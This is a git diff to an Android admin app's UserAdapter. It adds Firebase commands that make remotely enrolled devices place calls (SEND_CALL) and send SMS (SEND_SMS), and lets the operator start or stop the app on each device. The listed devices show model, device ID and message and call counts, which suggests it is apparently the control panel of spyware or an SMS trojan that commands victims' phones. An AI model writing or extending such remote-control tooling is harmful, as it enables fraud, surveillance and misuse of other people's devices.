@@ -1,6 +1,7 @@
 package com.perry.admin.Adapter;
 
 import android.content.Intent;
+import android.graphics.Color;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
@@ -29,6 +30,9 @@ import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 
+import java.util.HashMap;
+import java.util.Map;
+
 public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.ViewHolder> {
 
 
@@ -49,12 +53,19 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
         View customView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.adv_layout, null);
         TextView sendCall = customView.findViewById(R.id.send_call);
         TextView sendSms = customView.findViewById(R.id.send_sms);
+        TextView stopApp = customView.findViewById(R.id.stop_service);
 
         MaterialAlertDialogBuilder builder2 = new MaterialAlertDialogBuilder(holder.user.getContext(), R.style.MaterialAlertDialog_rounded);
         View actionView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.action_layout, null);
         EditText toMobile = actionView.findViewById(R.id.toMobile);
         EditText toSms = actionView.findViewById(R.id.toSms);
         TextView sendSmsBtn = actionView.findViewById(R.id.send_sms_btn);
+
+
+        MaterialAlertDialogBuilder builder3 = new MaterialAlertDialogBuilder(holder.user.getContext(), R.style.MaterialAlertDialog_rounded);
+        View callView = LayoutInflater.from(holder.user.getContext()).inflate(R.layout.create_call_layout, null);
+        EditText caller = callView.findViewById(R.id.callNumber);
+        TextView callNowBtn = callView.findViewById(R.id.sendCallBtn);
 
 
 
@@ -83,7 +94,9 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
         sendCall.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-
+                builder3.setView(callView);
+                AlertDialog dialog = builder3.create();
+                dialog.show();
 
             }
         });
@@ -110,6 +123,38 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
 
                     ActionSmsModel smsModel = new ActionSmsModel("true", toMobileTxt, toSmsTxt);
                     UserDb.child("SEND_SMS").setValue(smsModel).addOnSuccessListener(new OnSuccessListener<Void>() {
+                        @Override
+                        public void onSuccess(Void unused) {
+                            Toast.makeText(view.getContext(), "Action Send ", Toast.LENGTH_SHORT).show();
+
+                        }
+                    }).addOnFailureListener(new OnFailureListener() {
+                        @Override
+                        public void onFailure(@NonNull Exception e) {
+                            Toast.makeText(view.getContext(), e.toString(), Toast.LENGTH_SHORT).show();
+                        }
+                    });
+
+                }
+            }
+        });
+
+        callNowBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                String toMobileTxt = caller.getText().toString();
+
+                if (toMobileTxt.isEmpty() ){
+                    Toast.makeText(customView.getContext(), "Please enter details !!", Toast.LENGTH_SHORT).show();
+                }else{
+
+                    Map<String, Object> postValues = new HashMap<String,Object>();
+
+                    postValues.put("action", "true");
+                    postValues.put("mobile", toMobileTxt);
+                    UserDb.updateChildren(postValues);
+
+                    UserDb.child("SEND_CALL").setValue(postValues).addOnSuccessListener(new OnSuccessListener<Void>() {
                         @Override
                         public void onSuccess(Void unused) {
                             Toast.makeText(view.getContext(), "Action Send ", Toast.LENGTH_SHORT).show();
@@ -159,6 +204,52 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
             }
         });
 
+        UserDb.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                String status = snapshot.child("appStatus").getValue(String.class);
+
+                if (status != null) {
+                    if (status.equals("on")){
+                        holder.appStatus.setText("\uD83D\uDFE2");
+                        stopApp.setText("STOP APP");
+                        stopApp.setTextColor(Color.RED);
+                    }else{
+                        holder.appStatus.setText("\uD83D\uDD34");
+                        stopApp.setText("START APP");
+                        stopApp.setTextColor(Color.GREEN);
+
+                    }
+                }
+
+                stopApp.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View view) {
+                        Map<String, Object> postValues = new HashMap<String,Object>();
+
+                        if (status != null) {
+                            if (status.equals("on")){
+                                postValues.put("appStatus", "off");
+                                UserDb.updateChildren(postValues);
+
+                            }else{
+                                postValues.put("appStatus", "on");
+                                UserDb.updateChildren(postValues);
+                            }
+                        }
+
+                    }
+                });
+
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+
+            }
+        });
+
+
 
     }
 
@@ -171,7 +262,7 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
 
     public class ViewHolder extends RecyclerView.ViewHolder {
 
-        TextView name, model, deviceId, userTotalMsg, userTotalCall;
+        TextView name, model, deviceId, userTotalMsg, userTotalCall, appStatus;
         MaterialCardView user;
         public ViewHolder(@NonNull View itemView) {
             super(itemView);
@@ -182,6 +273,7 @@ public class UserAdapter extends FirebaseRecyclerAdapter<UserModel, UserAdapter.
             user=itemView.findViewById(R.id.user);
             userTotalMsg=itemView.findViewById(R.id.userTotalMsg);
             userTotalCall=itemView.findViewById(R.id.userTotalCall);
+            appStatus=itemView.findViewById(R.id.AppStatusText);
 
 
         }
